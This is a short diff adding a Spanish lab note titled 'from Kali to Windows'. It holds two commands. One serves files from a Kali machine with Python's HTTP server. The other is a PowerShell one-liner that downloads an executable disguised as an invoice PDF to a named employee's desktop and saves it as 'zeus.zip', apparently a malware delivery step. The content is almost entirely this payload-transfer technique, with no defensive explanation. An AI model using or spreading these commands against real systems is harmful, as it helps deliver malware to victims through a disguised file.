@@ -1,0 +1,5 @@
+Desde kali a windows
+kali--python3 -m http.server 8080
+windows--powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.0.9:8080/invoice_2318362983713_823931342io.pdf.exe','C:\Users\empleado1\Desktop\zeus.zip')"
+
+
